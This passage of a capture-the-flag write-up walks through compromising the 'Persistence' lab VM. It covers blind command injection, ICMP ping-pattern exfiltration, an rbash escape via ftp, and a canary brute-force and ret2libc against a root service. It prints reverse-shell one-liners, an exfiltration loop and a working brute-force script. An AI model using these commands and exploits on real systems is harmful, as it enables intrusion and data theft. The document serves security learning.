07:46:18.502842 IP 192.168.56.102 &gt; 192.168.56.104: ICMP echo reply, id 64004, seq 4, length 64
</code></p>

<p>&hellip; which it was. What is important to note here is that we have 4 echo requests.</p>

<p>I then proceeded to modify the input attempting to execute other commands too. None of my attempts returned any output to the browser, however, sending the field <code>;exit 0;</code> caused the HTTP request to complete almost instantly while no ping requests were observed on the <code>tcpdump</code>. This had me certain that this field was vulnerable to a command injection vulnerability.</p>

<p>This is all good, but not getting any output makes it really had to work with this. So, the next steps were to try and get a reverse/bind shell out of this command injection vulnerability.</p>

<p>I tried the usual culprits: <code>nc &lt;ip&gt;  &lt;port&gt; -e /bin/bash</code>; <code>bash -i &gt;&amp; /dev/tcp/&lt;ip&gt;/&lt;port&gt; 0&gt;&amp;1</code>; <code>php -r '$sock=fsockopen("&lt;ip&gt;",&lt;port&gt;);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</code>. None of them worked. Eventually I started to realize that I may have a much bigger problem here. What if none of these programs (nc/bash/php) are either not executable by me or simply not in my PATH? What if there was a egress packet filter configured?</p>

<h2>blind command injection &ndash; file enumeration</h2>

<p>Ok, so I took one step back and had to rethink my strategy. I have blind command execution, but how am I going to find out what else is going on on the filesystem? Up to now I have simply assumed too much.</p>

<p>I thought I should try and see if I can confirm the existence of files. To do this, I used a simple bash <code>if [ -f /file ]</code> statement, with a single ping for success, and 2 pings for a failure. The string for the <code>debug.php</code> input field looked something like this:</p>

<p><code>bash File existence check payload
;if [ -f /bin/sh ] ; then ping 192.168.56.102 -c 1 ; else ping 192.168.56.102 -c 2 ; fi
</code></p>

<p>Submitting the above input presented me with a single ping, confirming that <code>/bin/sh</code> exists.</p>

<p>```bash File existence response
root@kali:~# tcpdump icmp
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on eth0, link-type EN10MB (Ethernet), capture size 65535 bytes
08:15:53.557994 IP 192.168.56.104 > 192.168.56.102: ICMP echo request, id 63493, seq 1, length 64
08:15:53.558011 IP 192.168.56.102 > 192.168.56.104: ICMP echo reply, id 63493, seq 1, length 64</p>

<p>```</p>

<p>Checking for something like <code>/bin/sh2</code> responded with 2 pings, as expected. Awesome. I can now enumerate the existence of files. The concept itself is probably pretty useless, however, if I can confirm the existence of something useful, such as <code>/bin/nc</code>, I may end up with greater success of a shell!</p>

<p>I continued to test numerous files on numerous locations on disk. I noticed a few files that would generally be available on most Linux systems were not available according to my checker which was really odd. It actually had me doubt the check too. Nonetheless,  <code>/usr/bin/python</code> appeared to be available! I really like python so this had me really happy.</p>

<h2>blind command injection &ndash; port scanner</h2>

<p>I tested a few commands with <code>python -c</code>, such as sleep etc just to confirm that it is working. I then proceeded to try and get a reverse shell going using it.</p>

<p>No. Luck.</p>

<p>I no longer doubted the fact that I had a working interpreter, however, the question about a egress firewall still remains unanswered. To test this, I decided to code a small, cheap-and-nasty port &lsquo;prober&rsquo; so that I can try and determine which port is open outgoing. The idea was to watch my <code>tcpdump</code> for any tcp traffic comming from this host:</p>

<p>```python probe.py
import socket
for port in xrange(1, 65535):</p>

<pre><code>sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.settimeout(0.1)
sock.connect_ex(("192.168.56.102", port))
sock.close()
</code></pre>

<p>```</p>

<p>Using my blind command injection, I echoed this content to <code>/tmp/probe.py</code> via the input field, and then in a subsequent request, ran it using <code>python /tmp/probe.py</code>. I was relatively certain the script was running as intended as it took the expected amount of time (similar to when I was testing locally) to complete the HTTP request. According to my prober (and assuming it actually worked), there were 0 tcp ports open&hellip;</p>

<h2>data exfiltration</h2>

<p>With no tcp out, I had to once again rethink what I have up to now. The only output I have atm is a true/false scenario. Hardly sufficient to do anything useful. I found the <code>debug.php</code> file on disk and tried to echo a PHP web shell to the same directory. This also failed.</p>

<p>So, only ping eh. I recall something about ping tunnels/ping shells/ping something. So, I googled some of these solutions. There were a number of things I could try, however, I was wondering how the actual data transport was happening for these things.</p>

<p>Eventually, I came across the <code>-p</code> argument for ping after reading <a href="http://blog.commandlinekungfu.com/2012/01/episode-164-exfiltration-nation.html">this</a> blogpost. From <code>man 8 ping</code> we read:</p>

<p><code>bash ping patterns
-p pattern
   You may specify up to 16 ``pad'' bytes to fill out the packet you send.
   This is useful for diagnosing data-dependent problems in a network.
   For example, ``-p ff'' will cause the sent packet to be filled with all ones.
</code></p>

<p>So that changes things. I quickly confirmed that we have <code>xxd</code> available using my previous enumeration method and we did. Great.</p>

<p>I fired up tcpdump with the <code>-X</code> flag to show me the packet contents, and tested it out with the following payload for the <code>id</code> command:</p>

<p><code>bash Ping pattern `id` command
;id| xxd -p -c 16 | while read line; do ping -p $line -c 1 -q 192.168.56.102; done
</code></p>

<p>On the <code>tcpdump</code> side of things&hellip;</p>

<p>```bash Ping pattern tcpdump
root@kali:~/Desktop# tcpdump icmp -X
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on eth0, link-type EN10MB (Ethernet), capture size 65535 bytes
09:18:14.439222 IP 192.168.56.104 > 192.168.56.102: ICMP echo request, id 6920, seq 1, length 64</p>

<pre><code>0x0000:  4500 0054 0000 4000 4001 488a c0a8 3868  E..T..@.@.H...8h
0x0010:  c0a8 3866 0800 4b5b 1b08 0001 56a3 1a54  ..8f..K[....V..T
0x0020:  f357 0a00 6e67 696e 7829 2067 7569 643d  .W..nginx).guid=
0x0030:  3439 3828 6e67 696e 7829 2067 7569 643d  498(nginx).guid=
0x0040:  3439 3828 6e67 696e 7829 2067 7569 643d  498(nginx).guid=
0x0050:  3439 3828                                498(
</code></pre>

<p>09:18:14.439248 IP 192.168.56.102 > 192.168.56.104: ICMP echo reply, id 6920, seq 1, length 64</p>

<pre><code>0x0000:  4500 0054 a049 0000 4001 e840 c0a8 3866  E..T.I..@..@..8f
0x0010:  c0a8 3868 0000 535b 1b08 0001 56a3 1a54  ..8h..S[....V..T
0x0020:  f357 0a00 6e67 696e 7829 2067 7569 643d  .W..nginx).guid=
0x0030:  3439 3828 6e67 696e 7829 2067 7569 643d  498(nginx).guid=
0x0040:  3439 3828 6e67 696e 7829 2067 7569 643d  498(nginx).guid=
0x0050:  3439 3828                                498(
</code></pre>

<p>09:18:14.440365 IP 192.168.56.104 > 192.168.56.102: ICMP echo request, id 7176, seq 1, length 64</p>

<pre><code>0x0000:  4500 0054 0000 4000 4001 488a c0a8 3868  E..T..@.@.H...8h
0x0010:  c0a8 3866 0800 318a 1c08 0001 56a3 1a54  ..8f..1.....V..T
0x0020:  e35a 0a00 6769 6e78 2920 6772 6964 3d34  .Z..ginx).grid=4
0x0030:  3938 286e 6769 6e78 2920 6772 6964 3d34  98(nginx).grid=4
0x0040:  3938 286e 6769 6e78 2920 6772 6964 3d34  98(nginx).grid=4
0x0050:  3938 286e                                98(n
</code></pre>

<p>09:18:14.440382 IP 192.168.56.102 > 192.168.56.104: ICMP echo reply, id 7176, seq 1, length 64</p>

<pre><code>0x0000:  4500 0054 a04a 0000 4001 e83f c0a8 3866  E..T.J..@..?..8f
0x0010:  c0a8 3868 0000 398a 1c08 0001 56a3 1a54  ..8h..9.....V..T
0x0020:  e35a 0a00 6769 6e78 2920 6772 6964 3d34  .Z..ginx).grid=4
0x0030:  3938 286e 6769 6e78 2920 6772 6964 3d34  98(nginx).grid=4
0x0040:  3938 286e 6769 6e78 2920 6772 6964 3d34  98(nginx).grid=4
0x0050:  3938 286e                                98(n
</code></pre>

<p>09:18:14.441191 IP 192.168.56.104 > 192.168.56.102: ICMP echo request, id 7432, seq 1, length 64</p>

<pre><code>0x0000:  4500 0054 0000 4000 4001 488a c0a8 3868  E..T..@.@.H...8h
0x0010:  c0a8 3866 0800 ed92 1d08 0001 56a3 1a54  ..8f........V..T
0x0020:  f95d 0a00 286e 6769 6e78 290a 6f75 7073  .]..(nginx).oups
0x0030:  3d34 3938 286e 6769 6e78 290a 6f75 7073  =498(nginx).oups
0x0040:  3d34 3938 286e 6769 6e78 290a 6f75 7073  =498(nginx).oups
0x0050:  3d34 3938                                =498
</code></pre>

<p>09:18:14.441198 IP 192.168.56.102 > 192.168.56.104: ICMP echo reply, id 7432, seq 1, length 64</p>

<pre><code>0x0000:  4500 0054 a04b 0000 4001 e83e c0a8 3866  E..T.K..@..&gt;..8f
0x0010:  c0a8 3868 0000 f592 1d08 0001 56a3 1a54  ..8h........V..T
0x0020:  f95d 0a00 286e 6769 6e78 290a 6f75 7073  .]..(nginx).oups
0x0030:  3d34 3938 286e 6769 6e78 290a 6f75 7073  =498(nginx).oups
0x0040:  3d34 3938 286e 6769 6e78 290a 6f75 7073  =498(nginx).oups
0x0050:  3d34 3938                                =498
</code></pre>

<p>```</p>

<p>Mind. Blown.</p>

<p>In case you don&rsquo;t see it, we have extracts of the <code>id</code> command in the request/response packets like <em>98(nginx).grid=4</em>. While this is not really fun to decipher, and with commands that produce a lot of output even worse, it was in fact <strong>something</strong> to work with!</p>

<p>I fiddled around with this for a little while longer, trying to make the output a little more readable. Eventually I fired up scapy and just printed the data section of the packet. Not much better, but with a little more effort I am sure you can get something very workable out of it.</p>

<p>```python Scapy sniff()</p>

<blockquote><blockquote><blockquote><p>sniff(filter=&ldquo;icmp[icmptype] == 8 and host 192.168.56.104&rdquo;, prn=lambda x: x.load)
ؤT�nginx) guid=498(nginx) guid=498(nginx) guid=498(
ؤT
   ginx) grid=498(nginx) grid=498(nginx) grid=498(n
ؤT�(nginx)
oups=498(nginx)
oups=498(nginx)
oups=498
```</p></blockquote></blockquote></blockquote>

<h2>sysadmin-tool</h2>

<p>So with actual output to work with, I can almost say I have shell, however, it&rsquo;s crap. Here I had many options to go for. Do I try and get one of those ping tunnels up to shell with? Or something else.</p>

<p>At one stage I ran <code>ls</code> as the command trying to see if there was anything in the web path that I may not have found yet. A file called <em>sysadmin-tool</em> was revealed. I browsed to the file which pushed it as a download for me, and saved it locally. I then ran the bin through <code>strings</code>:</p>

<p><code>bash sysadmin-tool strings
root@kali:~# strings sysadmin-tool
/lib/ld-linux.so.2
__gmon_start__
libc.so.6
_IO_stdin_used
chroot
strncmp
puts
setreuid
mkdir
rmdir
chdir
system
__libc_start_main
GLIBC_2.0
PTRh
[^_]
Usage: sysadmin-tool --activate-service
--activate-service
breakout
/bin/sed -i 's/^#//' /etc/sysconfig/iptables
/sbin/iptables-restore &lt; /etc/sysconfig/iptables
Service started...
Use avida:dollars to access.
/nginx/usr/share/nginx/html/breakout
</code></p>

<p>From this alone we can deduce that when run, it may modify the firewall. It also looks like it contains some credentials, so I took note of those too. I then tried to run the command, followed by a nmap scan:</p>

<p><code>bash Ping pattern `id` command
;./sysadmin-tool --activate-service| xxd -p -c 16 | while read line; do ping -p $line -c 1 -q 192.168.56.102; done
</code></p>

<p>```bash second nmap of Persistence
root@kali:~# nmap 192.168.56.104 &mdash;reason -sV -p-</p>

<p>Starting Nmap 6.46 ( <a href="http://nmap.org">http://nmap.org</a> ) at 2014-09-18 09:46 SAST
Nmap scan report for 192.168.56.104
Host is up, received reset (0.0017s latency).
Not shown: 65533 filtered ports
Reason: 65533 no-responses
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 5.3 (protocol 2.0)
80/tcp open  http    syn-ack nginx 1.4.7</p>

<p>Service detection performed. Please report any incorrect results at <a href="http://nmap.org/submit/">http://nmap.org/submit/</a> .
Nmap done: 1 IP address (1 host up) scanned in 6637.05 seconds
```</p>

<p>Yay! SSH.</p>

<h2>shell and breakout as avida</h2>

<p>Using the information that looked like credentials retrieved in the previous section, I proceeded to SSH into the server:</p>

<p><code>bash avida rbash
root@kali:~/Desktop/persistence# ssh avida@192.168.56.104
The authenticity of host '192.168.56.104 (192.168.56.104)' can't be established.
RSA key fingerprint is 37:22:da:ba:ef:05:1f:77:6a:30:6f:61:56:7b:47:54.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '192.168.56.104' (RSA) to the list of known hosts.
avida@192.168.56.104's password:    # dollars
Last login: Thu Sep 18 05:57:30 2014
-rbash-4.1$
</code></p>

<p>Op success. Or is it? I immediately noticed the prompt as <code>rbash</code>, aka restricted bash. :( Having a look around, I was in fact very limited to what I can do. Most annoyingly, I was unable to run commands with a <code>/</code> in them.</p>

<p><code>bash rbash restrictions
-rbash-4.1$ /bin/bash
-rbash: /bin/bash: restricted: cannot specify `/' in command names
</code></p>

<p>So the next logical step was to attempt &lsquo;breaking out&rsquo; of this shell so that I can have a better look around. I was able to cat say <code>/etc/passwd</code>, but that only gets you <em>that</em> far :P</p>

<p>After quite some time and some research, it became apparent that the well known breakouts from rbash are not possible.  I was unable to edit my PATH, change files and re-login or use the classic <code>vi</code> <code>:shell</code> breakout. Eventually (and out of desperation), I focussed my attention to <code>ftp</code>. Opening <code>ftp</code>, and typing <code>help</code> at the prompt, I studied each available command carefully. In the list was a exclamation mark(!), which I typed and pressed enter:</p>

<p><code>bash bash via ftp o_0
-rbash-4.1$ ftp
ftp&gt; !
+rbash-4.1$ /bin/bash
bash-4.1$
</code></p>

<p>I got dropped into another <code>rbash</code> shell, however this time with a +. So, I went for <code>/bin/bash</code> and&hellip; w00t? I exported a new PATH to my environment, and all of those annoying rbash restrictions were gone. Thank goodness!</p>

<h2>the wopr game</h2>

<p>During the enumeration done while still stuck with <code>rbash</code>, I noticed that the machine was listening for connections on tcp/3333 locally when inspecting the output of <code>netstat</code>. Opening a telnet session to this port presented you with a &lsquo;game&rsquo;:</p>

<p>```bash wopr
bash-4.1$ telnet 127.0.0.1 3333
Trying 127.0.0.1&hellip;
Connected to 127.0.0.1.
Escape character is &lsquo;^]&rsquo;.
[+] hello, my name is sploitable
[+] would you like to play a game?</p>

<blockquote><p>yes!
[+] yeah, I don&rsquo;t think so
[+] bye!
Connection closed by foreign host.
bash-4.1$
```</p></blockquote>

<p>I asked really, really nicely, but no matter how polite I was, it would just not let me play!</p>

<p>Further inspection showed that the game was possibly run as root from <code>/usr/local/bin/wopr</code></p>

<p>```bash wopr as root
bash-4.1$ ps -ef | grep wopr
root      1005     1  0 05:42 ?        00:00:00 /usr/local/bin/wopr
root      1577  1005  0 06:43 ?        00:00:00 [wopr] <defunct>
avida     1609  1501  0 06:47 pts/0    00:00:00 grep wopr</p>

<p>bash-4.1$ ls -lah /usr/local/bin/wopr
-rwxr-xr-x. 1 root root 7.7K Apr 28 07:43 /usr/local/bin/wopr
```</p>

<p><code>wopr</code> was also readable to me which was great news! I decided to get a copy of the binary onto my local Kali Linux box, and take a closer look at the internals:</p>

<p>```bash wopr xxd xfer</p>

<h1>first, hex encode the file</h1>

<p>bash-4.1$ xxd -p -c 36 /usr/local/bin/wopr
7f454c460101010000000000000000000200030001000000c08604083400000080110000
0000000034002000090028001e001b000600000034000000348004083480040820010000
[&hellip; snip &hellip;]
38362e6765745f70635f7468756e6b2e6278006d61696e005f696e697400
bash-4.1$</p>

<h1>next, I copied the xxd output from the persistence terminal</h1>

<h1>and pasted it into a file called wopr.xxd. Then reverted it</h1>

<h1>and redirected the output to <code>wopr</code></h1>

<p>root@kali:~# cat wopr.xxd | xxd -r -p > wopr
```</p>

<p>The idea was to see if there may be a way to exploit this program so that I can execute some commands using it. It is running as root after all&hellip;</p>

<h2>wopr, stack smashing</h2>

<p>Poking around the binary, I mostly used <code>gdb</code> along with <a href="https://github.com/longld/peda">peda</a>.
Checksec revealed that this binary was compiled with quite a few security features built in.</p>

<p><code>bash wopr binary sec
root@kali:~# gdb -q ./wopr
Reading symbols from persistence/wopr...(no debugging symbols found)...done.
gdb-peda$ checksec
CANARY    : ENABLED
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : Partial
</code></p>

<p>Digesting the above output should bring us to a few conclusions. A stack canary is present, meaning if we corrupt memory, and dont have a correct canary, the binary may terminate itself as a protection mechanism once it detects the incorrect canary. Secondly, the binary is compiled to mark the stack as non executable. Any potential shellcode that we write here will not be executed. Lastly, the GOT relocation is set to read only, meaning function locations are resolved at the beginning of execution and the GOT is then marked as read only resulting in the inability to rewrite plt type lookups.</p>

<p>With all of that in mind, I ran the binary with the <code>r</code> command, and made a new telnet session to it.</p>

<p><code>bash wopr run
gdb-peda$ r
[+] bind complete
[+] waiting for connections
[+] logging queries to $TMPLOG
[+] got a connection
[New process 26936]
[Inferior 2 (process 26936) exited normally]
Warning: not running or target is remote
gdb-peda$
</code></p>

<p>When the new connection came in, a notice of a new process appears. Disassembling the main function gives us an indication that the process is doing a <code>fork()</code></p>

<p>```bash wopr fork()
gdb-peda$ disass main
Dump of assembler code for function main:</p>

<pre><code>[.. snip ..]
</code></pre>

<p>   0x080489fd &lt;+543>:   mov    DWORD PTR [esp],0x8048cb2
   0x08048a04 &lt;+550>:   call   0x804866c &lt;puts@plt>
   0x08048a09 &lt;+555>:   call   0x804867c &lt;fork@plt> # &lt;&mdash;
   0x08048a0e &lt;+560>:   test   eax,eax
   0x08048a10 &lt;+562>:   jne    0x8048b0e &lt;main+816>
   0x08048a16 &lt;+568>:   mov    DWORD PTR [esp+0x8],0x21
   0x08048a1e &lt;+576>:   mov    DWORD PTR [esp+0x4],0x8048cc8
   0x08048a26 &lt;+584>:   mov    eax,DWORD PTR [ebp-0x22c]
   0x08048a2c &lt;+590>:   mov    DWORD PTR [esp],eax
   0x08048a2f &lt;+593>:   call   0x804858c &lt;write@plt></p>

<pre><code>[.. snip ..]
</code></pre>

<p>End of assembler dump.
gdb-peda$
```</p>

<p>Why is the <code>fork()</code> so important!? We will see in a bit just hang on. :)</p>

<p>So back to fuzzing wopr, I proceeded to send some arbtritary input via the telnet session. I noticed once I had sent more than 30 characters as input, wopr would freak out! This is a good freak out btw :D</p>

<p>Sending 30 x A&rsquo;s results in:
<code>bash wopr stopper
gdb-peda$ [+] got a connection
*** stack smashing detected ***: wopr terminated
======= Backtrace: =========
/lib/i386-linux-gnu/libc.so.6(__fortify_fail+0x40)[0xb7f5ebb0]
/lib/i386-linux-gnu/libc.so.6(+0xeab6a)[0xb7f5eb6a]
wopr[0x80487dc]
wopr[0x8048ad6]
/lib/i386-linux-gnu/libc.so.6(__libc_start_main+0xe6)[0xb7e8ae36]
wopr[0x80486e1]
======= Memory map: ========
08048000-08049000 r-xp 00000000 08:01 1184792    wopr
08049000-0804a000 r--p 00000000 08:01 1184792    wopr
0804a000-0804b000 rw-p 00001000 08:01 1184792    wopr
0804b000-0806c000 rw-p 00000000 00:00 0          [heap]
b7e3b000-b7e57000 r-xp 00000000 08:01 1573598    /lib/i386-linux-gnu/libgcc_s.so.1
b7e57000-b7e58000 rw-p 0001b000 08:01 1573598    /lib/i386-linux-gnu/libgcc_s.so.1
b7e73000-b7e74000 rw-p 00000000 00:00 0
b7e74000-b7fbd000 r-xp 00000000 08:01 1580474    /lib/i386-linux-gnu/libc-2.13.so
b7fbd000-b7fbe000 ---p 00149000 08:01 1580474    /lib/i386-linux-gnu/libc-2.13.so
b7fbe000-b7fc0000 r--p 00149000 08:01 1580474    /lib/i386-linux-gnu/libc-2.13.so
b7fc0000-b7fc1000 rw-p 0014b000 08:01 1580474    /lib/i386-linux-gnu/libc-2.13.so
b7fc1000-b7fc4000 rw-p 00000000 00:00 0
b7fde000-b7fe1000 rw-p 00000000 00:00 0
b7fe1000-b7fe2000 r-xp 00000000 00:00 0          [vdso]
b7fe2000-b7ffe000 r-xp 00000000 08:01 1579852    /lib/i386-linux-gnu/ld-2.13.so
b7ffe000-b7fff000 r--p 0001b000 08:01 1579852    /lib/i386-linux-gnu/ld-2.13.so
b7fff000-b8000000 rw-p 0001c000 08:01 1579852    /lib/i386-linux-gnu/ld-2.13.so
bffdf000-c0000000 rw-p 00000000 00:00 0          [stack]
</code></p>

<p>So it looks like we may have a <a href="http://en.wikipedia.org/wiki/Stack_buffer_overflow">buffer overflow</a> here. What is important though is the backtrace shows that the last fail was in <code>__fortify_fail</code>. <code>__fortify_fail</code> is normally just a error reporter, as was called because the stack cookie check failed. Remember the CANARY we detected earlier with the <code>checksec</code> output? With that knowledge, is almost safe to assume that byte 30 is where the stack canary starts. This means that if we want to corrupt more memory further up the stack (which is what we want actually), we need to find a way to know what the canary value is.</p>

<p>But lets not stop there. I continued to place more A&rsquo;s into the input until at byte 39 I noticed 41 (hex for A) in the backtrace. By the time I had 42 A&rsquo;s, the backtrace had a full 4 bytes of 41.</p>

<p><code>bash possible EIP
[+] got a connection
*** stack smashing detected ***: wopr terminated
======= Backtrace: =========
/lib/i386-linux-gnu/libc.so.6(__fortify_fail+0x40)[0xb7f5ebb0]
/lib/i386-linux-gnu/libc.so.6(+0xeab6a)[0xb7f5eb6a]
wopr[0x80487dc]
[0x41414141]        #&lt;-- EIP?
</code></p>

<p>Was this where EIP was?</p>

<p>With the debugging we have done thus far, lets assume that the stack layout looks something like this:</p>

<p>```text
&ndash; &ndash;>         &ndash; &ndash;>        [42 Bytes  in Total]        &ndash; &ndash;>         &ndash; ></p>

<p>[        30 Bytes Data         ] [  Cookie  ] [  4 Bytes  ] [  EIP  ]</p>

<ul>
<li>&ndash;>         &ndash; &ndash;>        [42 Bytes  in Total]        &ndash; &ndash;>         &ndash; >
```</li>
</ul>


<h2>wopr &ndash; stack canary bruteforce</h2>

<p>This part of the challenge took me the second longest to nail. I have zero knowledge of stack cookies, let alone experience in bypassing them. So I had to pack out my best Google-fu abilities and learn all I can about bypassing these cookies.</p>

<p>A lot was learnt here. The 3 primary resources that really helped me get the ball rolling into something workable was</p>

<ul>
<li><a href="http://phrack.org/issues/67/13.html">Phrack Issue 67</a></li>
<li><a href="http://fluxius.handgrep.se/2011/10/20/the-art-of-elf-analysises-and-exploitations/">The Art Of ELF: Analysis and Exploitations</a></li>
<li><a href="http://www.pwntester.com/blog/2013/12/31/fusion-level04-write-up/">Fusion level04 write-up</a> (SPOILER ALERTS for another CTF)</li>
</ul>


<p>Now, remember I mentioned <code>fork()</code> earlier on? From the Phrack article, we can read some interesting ideas about binaries that make use of <code>fork()</code> and how this affects stack cookies.</p>

<p>From <code>man 2 fork</code>&rsquo;s description:</p>

<p>```bash fork man
DESCRIPTION</p>

<pre><code> Fork() causes creation of a new process.  The new process (child process) 
 is an exact copy of the calling process (parent process) except for the 
 following:
</code></pre>

<p> [.. snip ..]
```</p>

<p>What this means for us then is that every time we have a new <code>fork()</code> happen, the stack cookie will supposedly remain constant between forks as it comes from the parent. <em>”Soooooooo what?”</em> I hear you say! Well, that means we can attempt to try all of the possible ASCII characters as hex, 4 times (for 4 bytes), to try and brute force this value!</p>

<p>The theory for this was great, but the practice was a different story. In order to perform a successful brute force, at the very minimum, I needed a reliable way to determine a correct and incorrect value. With my local copy of <code>wopr</code>, I can just watch the console output, however, I don&rsquo;t have that luxury on the Persistence VM!</p>

<p>While thinking about this problem, I started to code a little script to start the juices flowing in getting this brute force right. The basic idea was to have a nested xrange(4) &ndash;> xrange(255) concat the values to a variable as they are determined. While tinkering with the script and the TCP socket code, I started to realize that there may actually be a way to remotely determine a failed and successful attempt!</p>

<p>When a string of less than 30 A&rsquo;s is sent, the server will send a &ldquo;[+] bye!&rdquo; message before closing the socket. More than 30 A&rsquo;s, and the socket is killed before the bye</p>

<p>```bash Canary Brute Success Condition
root@kali:~# telnet 127.0.0.1 3333
Trying 127.0.0.1&hellip;
Connected to 127.0.0.1.
Escape character is &lsquo;^]&rsquo;.
[+] hello, my name is sploitable
[+] would you like to play a game?</p>

<blockquote><p>A
[+] yeah, I don&rsquo;t think so
[+] bye!                           # &lt;&mdash; We have a bye!
Connection closed by foreign host.</p></blockquote>

<p>root@kali:~# telnet 127.0.0.1 3333
Trying 127.0.0.1&hellip;
Connected to 127.0.0.1.
Escape character is &lsquo;^]&rsquo;.
[+] hello, my name is sploitable
[+] would you like to play a game?</p>

<blockquote><p>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
[+] yeah, I don&rsquo;t think so
Connection closed by foreign host. # &lt;&mdash; No bye!
```</p></blockquote>

<p>This was perfect and exactly what was needed to complete the brute force script! All I had to do was check for the word <em>bye</em> in the last socket receive to know if we have succeeded or not. The resultant script was therefore:</p>

<p>```python canary_brute.py
import socket
import sys</p>

<p>payload = &ldquo;A&rdquo; * 30  # amount of bytes before the first canary bit is hit
canary = &ldquo;&rdquo;         # the canary</p>

<h1>start the canary brute loop. We want to brute 4 bytes &hellip;</h1>

<p>for x in xrange(1,5):</p>

<pre><code># ... and try all possibilities
for canary_byte in xrange(0, 256):

    # prepare the byte
    hex_byte = chr(canary_byte)

    # prepare the payload
    send = payload + canary + hex_byte

    print "[+] Trying: '\\x{0}' in payload '%s' (%d:%d/255)".format(hex_byte.encode("hex")) % (send, x, canary_byte)

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect(('127.0.0.1', 3333))

    # get the inital banners
    sock.recv(35)   # [+] hello, my name is sploitable\n
    sock.recv(40)   # [+] would you like to play a game?\n
    sock.recv(5)    # &gt;

    # send the payload  
    sock.send(send)
    sock.recv(27)   # [+] yeah, I don't think so\n

    # if we have a OK response, then we will have this last part
    # as '[+] bye!\n' populated, if its wrong, not
    data =  sock.recv(64)   # [+] bye!\n
    if "bye" in data:
        print "[!!] Found a possible canary value of '{0}'!".format(hex_byte.encode("hex"))
        canary += hex_byte
        sock.close()
        break

    sock.close()

# if we cant even find the first byte, we failed already
if len(canary) &lt;= 0:
    print "[-] Unable to even find the first bit. No luck"
    sys.exit(0)
</code></pre>

<p>if len(canary) > 0:</p>

<pre><code>print "[+] Canary seems to be {0}".format(canary.encode("hex"))
</code></pre>

<p>else:</p>

<pre><code>print "[-] Unable to brute canary"
</code></pre>

<p>```</p>

<p>An example run of this would end as follows:</p>

<p><code>bash Running canary_brute.py
[+] Trying: '\x8d' in payload 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' (4:141/255)
[+] Trying: '\x8e' in payload 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' (4:142/255)
[+] Trying: '\x8f' in payload 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' (4:143/255)
[+] Trying: '\x90' in payload 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' (4:144/255)
[!!] Found a possible canary value of '90'!
[+] Canary seems to be 00ef8d90
</code></p>

<p>Winning. Just to make 100% sure I actually have the correct canary, I made another small socket program just to append the canary to the initial 30 A&rsquo;s and send it. No stack smashing message appeared and we got the <em>bye</em> message :)</p>

<h2>wopr &ndash; NX and EIP</h2>

<p>If you can recall from earlier, <code>wopr</code> was compiled with the NX bit set. Effectively that means we can&rsquo;t simply exploit this vulnerability by setting EIP to the beginning of shellcode we simply sent along with the payload as the stack is not executable. Thankfully though, there is a concept such as ret2libc.</p>

<p>The idea behind ret2libc is to steer the application flow to useful commands within libc itself, and get code execution that way. A very popular function to use is the <code>system()</code> command, for almost obvious reasons.</p>

<p>I decided to make use of the same method. I quickly checked to see if ASLR was enabled on the Persistence VM:</p>

<p>```bash ASLR check
bash-4.1$ ldd /usr/local/bin/wopr</p>

<pre><code>linux-gate.so.1 =&gt;  (0xb7fff000)
libc.so.6 =&gt; /lib/libc.so.6 (0xb7e62000)
/lib/ld-linux.so.2 (0x00110000)
</code></pre>

<p>bash-4.1$ ldd /usr/local/bin/wopr</p>

<pre><code>linux-gate.so.1 =&gt;  (0xb7fff000)
libc.so.6 =&gt; /lib/libc.so.6 (0xb7e62000)
/lib/ld-linux.so.2 (0x00110000)
</code></pre>

<p>```</p>

<p>The addresses for the linked files remained static between all of the lookups, indicating that ASLR was not enabled. This makes things slightly easier. Because this is a 32bit OS though, even if it was enabled it would not have been too much of a issue :)</p>

<p>The next step was to find out where system() lived in libc. This is also a very easy step to perform. A interesting note here. GDB was using the SHELL env variable for commands, and because I have come from rbash, it was still set to that. A simple <code>export SHELL=/bin/bash</code> fixed it though. Also, just to be clear, I am now doing this address lookup on the Persistence VM, however I had to do exactly the same thing on the Kali VM where I was building my exploit.</p>

<p>```bash finding system()
bash-4.1$ export SHELL=/bin/bash</p>

<p>bash-4.1$ gdb -q /usr/bin/telnet
Reading symbols from /usr/bin/telnet&hellip;(no debugging symbols found)&hellip;done.
Missing separate debuginfos, use: debuginfo-install telnet-0.17-47.el6_3.1.i686
(gdb) b *main   # set a breakpoint to stop the flow once we hit the main() func
Breakpoint 1 at 0x7b90</p>

<p>(gdb) r         # run the program
Starting program: /usr/bin/telnet
Breakpoint 1, 0x00117b90 in main ()</p>

<p>(gdb) p system  # We hit our breakpoint, lets leak the address for system()
$1 = {<text variable, no debug info>} 0xb7e56210 <system>
(gdb)
```</p>

<p>We find <code>system()</code> at <code>0xb7e56210</code>. I used the telnet binary simply because it is also linked to libc.</p>

<p>So to sum up what we have so far, lets take another look at what the stack will look like now when sending our exploit payload:</p>

<p>```text Stack after memory corruption up to EIP
&ndash; &ndash;>         &ndash; &ndash;>        [42 Bytes  in Total]        &ndash; &ndash;>           &ndash; ></p>

<p>[   A x 30   ] [  \xff\xff\xff\xff  ] [  AAAA  ] [  \x10\x62\xe5\xb7  ]
 ^~ Initial BF    ^~ Bruted cookie                    ^~ system()</p>

<ul>
<li>&ndash;>         &ndash; &ndash;>        [42 Bytes  in Total]        &ndash; &ndash;>           &ndash; >
```</li>
</ul>


<p>The address for <code>system()</code> is &lsquo;backwards&rsquo; because we are working with a <a href="http://en.wikipedia.org/wiki/Endianness">little endian</a> system. The 4 * A before the address to <code>system()</code> is simply padding to EIP.</p>

<h2>wopr &ndash; code exec</h2>

<p>This part, by far, took me <strong>the longest</strong> of the entire challenge!</p>

